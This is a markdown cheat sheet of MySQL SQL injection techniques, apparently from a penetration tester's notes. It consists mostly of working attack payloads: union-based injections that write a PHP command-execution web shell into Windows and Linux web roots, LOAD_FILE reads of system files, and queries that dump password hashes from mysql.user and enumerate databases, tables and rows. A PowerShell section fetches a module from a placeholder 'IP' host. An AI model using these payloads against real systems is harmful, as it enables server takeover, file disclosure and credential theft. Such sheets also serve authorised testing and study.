# sqli mysql

## Checks for UDF (if root on mysql)

```bash
# checking if database has been misconfigured to allow insecure handling of files.
SHOW VARIABLES LIKE "secure_file_priv";

# where udf files are loaded from
@@plugin_dir;
SHOW VARIABLES LIKE 'plugin_dir';
```

## SQLi shell

```bash
# windows
?id=1 union all select 1,2,"<?php echo system($_GET['cmd']);?>",4 into OUTFILE 'c:/xampp/htdocs/cmd.php'

# linux
?id=1 union all select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4 into OUTFILE '/var/www/html/cmd.php'
# try: "<?php echo exec($_GET["cmd"]);"
# try: replace "php-payload" with (php-payload)
```

## my-sql commands

```bash
# comments
#
--
/* <blah> */

# other ways
# 0x3a separates the field with a ':'
concat(col_1)
concat(col_1,0x3a,col_2)
concat(0x28,col_1,0x3a,col_2,0x29)

# hostname
@@hostname

# data directory
@@datadir

# version
@@version
version()

# read-file
# C:\Windows\System32\Drivers\etc\hosts
# C:\\Windows\\System32\\Drivers\\etc\\hosts
LOAD_FILE('<file>')
TO_BASE64(LOAD_FILE('<file>'))

# users
user()
system_user()
| SELECT user FROM mysql.user

# password (md5)
# TO_BASE64(password)
| SELECT password FROM mysql.user

# databases
database()
| SELECT schema_name FROM information_schema.schemata;

# tables
SELECT table_name FROM information_schema.tables WHERE table_schema='<db>'
# can use WHERE table_schema IN (0x<table-in-hex>, 0x<table-in-hex>)

# cols
SELECT column_name FROM information_schema.columns WHERE table_name='<table>'
describe [<db>.]<table>

# nth row
# to get total-rows
SELECT count(*) FROM <table>
# enumerate incrementally
SELECT <col> FROM <table> LIMIT <n>,1
SELECT <col> FROM <table> LIMIT 1 OFFSET <n>
```

## mysql w/ powershell

```bash
https://mcpmag.com/articles/2016/03/02/querying-mysql-databases.aspx/
fix: https://adamtheautomator.com/powershell-get-credential/#Create_a_Credential_without_a_Prompt
wget https://github.com/adbertram/MySQL/archive/master.zip -O MySQL.zip

# setup
Invoke-WebRequest  -Uri http://IP/MySQL.zip -OutFile 'C:\MySQL.zip'

$modulesFolder = 'C:\Program Files\WindowsPowerShell\Modules'
Expand-Archive -Path C:\MySql.zip -DestinationPath $modulesFolder
Rename-Item -Path "$modulesFolder\MySql-master" -NewName MySQL

# usage
$user = '<user>'
$password = ConvertTo-SecureString '<password>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($user, $password)

Connect-MySqlServer -Credential $credential -ComputerName 'localhost' -Database "<db>"
Invoke-MySqlQuery  -Query "select @@version;"
```

## Error based

{% embed url="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/" %}
